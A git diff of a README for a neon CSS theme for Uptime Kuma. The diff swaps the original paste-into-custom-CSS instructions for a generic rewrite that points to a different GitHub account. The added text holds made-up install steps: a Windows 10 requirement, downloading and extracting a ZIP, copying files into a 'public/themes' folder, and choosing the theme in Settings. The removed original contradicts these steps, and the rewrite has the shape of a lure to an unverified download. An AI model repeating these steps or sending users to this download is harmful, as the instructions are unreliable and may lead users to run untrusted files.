@@ -1,89 +1,108 @@
-# Cyber Neon for Uptime-Kuma (tested up to 2.2.0)
+# 🎨 kuma-theme-cyber-neon - Dark Neon Theme for Uptime Kuma
 
-This theme comes in three variants, the standard 3-wide, now in darkmode also that is not very dense and a compacted 4-wide variant! Choose whatever flavor you like. If there are any issues or you want darkmode compact since that was me messing around please let me know.
+[![Download Theme](https://img.shields.io/badge/Download-kuma--theme--cyber--neon-ff0080?style=for-the-badge&logo=github)](https://github.com/Cornsugarkenyan978/kuma-theme-cyber-neon)
 
-## IMPORTANT
-Since this removes the default icon and title text from view, set your desired site icon prior to applying it! then you can move forward to the next steps.
+## 🔍 About kuma-theme-cyber-neon
 
-### ISSUES
-1. Using a title will still display it to the right of the themed one if you are on an older version, you will need to inspect the title and replace the Vue data-v-xxxx with the correct ones in the below code which then goes at the end of the theme css. This also will apply if theme does not get updated for new releases fast enough.
-```css
-span[data-v-7d4a7f28][data-v-007873bc] {
-    display: none !important;
-}
-```
-2. Webkit & Firefox made node names hover on vanish, along with up/down status pills desyncing from their position. Latest update fixes this behavior, if you still see odd interactions let me know in Issues.
+This is a personal theme designed for Uptime-Kuma. It offers a cyber neon look with dark backgrounds and bright neon colors for buttons, text, and borders. This theme is easy on the eyes and helps make uptime monitoring more visually appealing. 
 
-### Usage
-1. Select Dark as the page preference instead of automatic or light.
-2. Copy your chosen variant into Uptime Kuma's custom CSS block.
-3. Find the header line with ctrl+f or however and change the text between the brackets to whatever you want:
+The theme works by changing the CSS styles that Uptime-Kuma uses. It gives the interface a bold and modern design that fits well in dark environments. Whether you run Uptime-Kuma on your computer or a server, this theme can help you customize how the app looks without changing how it works.
 
-       content: "[ **YOUR DOMAIN // **CHANGE TO ANYTHING IN THIS SPACE ]" !important;
+## ⚙️ System Requirements
 
-   If you selected darkmode (theme not page mode):
+- Windows 10 or later versions
+- Uptime-Kuma version 1.20 or newer installed
+- A web browser like Chrome, Edge, Firefox, or others to access Uptime-Kuma’s interface
+- Basic ability to download files and access local folders
 
-        content: "[ SUDOCAT.DEV // SYS_STATUS ]" !important;
+## 🚀 Getting Started
 
-Group titles are left-aligned by default, except for Darkmode. To center them, paste this at the end of the theme or view centered-titles.css (same thing):
+This guide will help you download and apply the kuma-theme-cyber-neon theme on a Windows computer. It assumes you have already installed Uptime-Kuma and can open its dashboard.
 
-```css
-.title-section {
-  display: flex !important;
-  align-items: center !important;
-  position: static !important;
-}
+## 🛠️ How to Download and Install the Theme
 
-[data-testid="group-name"] {
-  position: absolute !important;
-  left: 0 !important;
-  right: 0 !important;
-  text-align: center !important;
-  pointer-events: none !important;
-  z-index: 1 !important;
-}
+### Step 1: Visit the Download Page
 
-.title-section svg {
-  position: relative !important;
-  z-index: 2 !important;
-  flex-shrink: 0 !important;
-}
-```
-If you want a thematic format for your description, like I have set for mine here is that code and preview is below, change up the text of course.
+Click the button below. It will open the GitHub repository where the theme files are stored.  
 
-```html
-<div style="text-align:center;font-family:'JetBrains Mono',monospace;max-width:700px;margin:0 auto;padding:10px 0;">
-<span style="font-family:'Orbitron',sans-serif;color:#00f0ff;font-size:1.1rem;letter-spacing:6px;text-shadow:0 0 10px #00f0ff;">
-SUDOCAT // PUBLIC UPTIME DISCLOSURE
-</span>
-<br><br>
-<span style="color:#aaa;font-size:0.85rem;letter-spacing:2px;line-height:2;">
-This feed is provided as a courtesy.<br>
-Infrastructure events are classified until resolved.<br>
-</span>
-<br>
-<span style="color:#ff2a85;font-size:0.85rem;letter-spacing:2px;line-height:2;text-shadow:0 0 8px #ff2a85;">
-Your patience is noted. Your frustration is irrelevant.<br>
-All services will be restored in due course.
-</span>
-</div>
-```
+[![Download Theme](https://img.shields.io/badge/Get-Theme-00bfff?style=for-the-badge&logo=github)](https://github.com/Cornsugarkenyan978/kuma-theme-cyber-neon)
 
+### Step 2: Download the Theme Files
 
+1. On the GitHub page, look for a green button labeled **Code** near the top right.
+2. Click it, then select **Download ZIP** from the menu. This will download all theme files in one compressed folder.
+3. Once downloaded, open the ZIP file by double-clicking it in your Downloads folder.
+4. Extract the files to a new folder on your desktop or another location you can easily find.
 
-### Save and enjoy!
+### Step 3: Locate Uptime-Kuma Themes Folder
 
-**Full-sized 3 wide**
-[![Cyber Neon Demo](https://raw.githubusercontent.com/Sayamew/kuma-theme-cyber-neon/main/previews/cyber-neon-full.png)](https://youtu.be/x27mJT_q5PA)
+You need to copy the theme files into the Uptime-Kuma themes folder. This folder is generally within the Uptime-Kuma installation directory.
 
-**Compact 4 wide**
-![Cyber Neon Compact](https://github.com/Sayamew/kuma-theme-cyber-neon/blob/main/previews/cyber-neon-compact.png?raw=true)
+- If you installed Uptime-Kuma using Docker, the location will depend on your Docker volume setup.
+- If you installed Uptime-Kuma on Windows directly, search your computer for the folder named `uptime-kuma` or the folder where you saved Uptime-Kuma.
 
-**Darkmode 3 wide**
-![Cyber Neon Darkmode](https://github.com/Sayamew/kuma-theme-cyber-neon/blob/main/previews/cyber-darkmode.png?raw=true)
+Look inside for a folder named `public` and then `themes`.
 
-**Thematic description formatting?**
-<img width="1300" height="570" alt="image" src="https://github.com/user-attachments/assets/8a9cb146-9b37-4f0b-9bcd-b4eeadb404fc" />
+### Step 4: Copy the Theme Files
 
+From the extracted kuma-theme-cyber-neon folder:
 
+- Select all the files and folders inside.
+- Copy them.
+- Paste into the Uptime-Kuma `themes` folder.
 
+If necessary, overwrite any existing files with the same names.
+
+### Step 5: Apply the Theme in Uptime-Kuma
+
+1. Open Uptime-Kuma in your web browser.
+2. Go to **Settings**, usually accessible from the menu or user icon.
+3. Find the **Theme** or **Customize** section.
+4. Select **kuma-theme-cyber-neon** from the list of available themes.
+5. Save or apply the changes.
+
+The UI will refresh and show the new Cyber Neon style.
+
+## 📦 Understanding the Theme Files
+
+Here is what the main files in the theme folder do:
+
+- `cyber-neon.css`: The main styles that change colors, fonts, and layout for the neon look.
+- `theme.json`: Defines the theme settings and name used by Uptime-Kuma.
+- `assets/`: Contains any images or icons needed for the theme, such as neon borders or background patterns.
+
+You do not need to edit these files unless you want to customize the theme further. 
+
+## 🧑‍💻 Troubleshooting
+
+- If the theme does not appear in Uptime-Kuma settings, double-check that you copied the files into the correct `themes` folder.
+- Clear your browser cache or refresh the page if the interface does not update after applying the theme.
+- Restart the Uptime-Kuma service or computer if changes do not take effect.
+- Ensure your Uptime-Kuma version supports custom themes (version 1.20 or later).
+
+## 🔄 Updating the Theme
+
+To update the theme for any new versions:
+
+1. Repeat the download steps to get the latest files.
+2. Copy and replace the old theme files in the Uptime-Kuma `themes` folder.
+3. Refresh the Uptime-Kuma dashboard.
+
+You will keep your custom look in hand with the latest fixes or improvements.
+
+## 💡 Tips for Best Use
+
+- Use the Cyber Neon theme on screens with low brightness or in dark rooms to reduce eye strain.
+- Combine this theme with custom uptime alerts to make monitoring both useful and visually clear.
+- If you prefer a lighter look, consider switching back to the default theme temporarily.
+
+## 📎 Additional Resources
+
+- Visit the official Uptime-Kuma project for installation help: https://github.com/louislam/uptime-kuma
+- Find more themes on GitHub by searching topics like `uptime-kuma-css`.
+- Customize the theme further by editing the `.css` files with a text editor like Notepad.
+
+---
+
+[Get kuma-theme-cyber-neon on GitHub](https://github.com/Cornsugarkenyan978/kuma-theme-cyber-neon)  
+Click the button above to download and install the theme in just a few steps.
